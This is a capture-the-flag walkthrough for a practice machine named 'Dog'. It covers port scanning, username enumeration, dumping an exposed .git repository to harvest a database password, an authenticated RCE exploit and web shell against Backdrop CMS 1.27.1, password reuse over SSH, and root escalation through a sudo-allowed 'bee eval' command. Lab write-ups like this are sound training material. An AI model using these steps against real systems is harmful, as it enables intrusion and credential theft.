# 🐶 Dog

## 📝 Overview

The machine uses **Backdrop CMS 1.27.1**, vulnerable to Authenticated Remote Code Execution (RCE).  
The goal is to enumerate the web application, exploit Backdrop CMS, and escalate privileges to root.

## 🔍 Enumeration

Nmap:
```sh
nmap -p- -T4 10.10.11.58
nmap -sV -sC -p 22,80 10.10.11.58
```
Add the host to /etc/hosts:
```sh
echo "10.10.11.58 dog.htb" | sudo tee -a /etc/hosts
```
Username Enumeration (Password Reset Form):
```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
-X POST -d "name=FUZZ&form_id=user_pass&op=Reset+password" \
-u http://10.10.11.58/?q=user/password -mr "Sorry, .* is not recognized as a user name"
```

## 📂 Git Repository Dump

```bash
python3 -m venv venv
source venv/bin/activate
pip install git-dumper
git-dumper http://10.10.11.58/.git/ ./doggit
```

## 🔑 Credential & Sensitive Information Search on dump git

```bash
grep -Ri 'user' .
grep -Ri 'username' .
grep -Ri 'password' .
grep -Ri 'pass' .
grep -Ri 'admin' .
grep -Ri '.htb'
grep -Eroi "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}" .
```
Found credentials:
```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```
And user:
```
tiffany@dog.htb
```

## ⚡ Exploiting Backdrop CMS 1.27.1 (Authenticated RCE)

The machine is vulnerable to **Backdrop CMS 1.27.1 – Authenticated Remote Command Execution**:  
[Exploit-DB #52021](https://www.exploit-db.com/exploits/52021)

```bash
# Install new module manually
python exploit.py http://10.10.11.58

# Package and upload web shell
tar -czvf shell.tar.gz shell/
# Access web shell
http://10.10.11.58/modules/shell/shell.php?cmd=id
# Find another user:
cat /etc/passwd/
```

## 🧗Password Reuse & Privilege Escalation

Login as johncusack using reused password:
```bash
# johncusack // BackDropJ2024DS2024

# Upload linPEAS for enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
scp linpeas.sh johncusack@10.10.11.58:.

# Basic enumeration
id
groups
uname -a
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
sudo -l

# Privilege escalation via Backdrop bee command
cd /var/www/html
sudo /usr/local/bin/bee --root eval "system('cat /root/root.txt');"
```
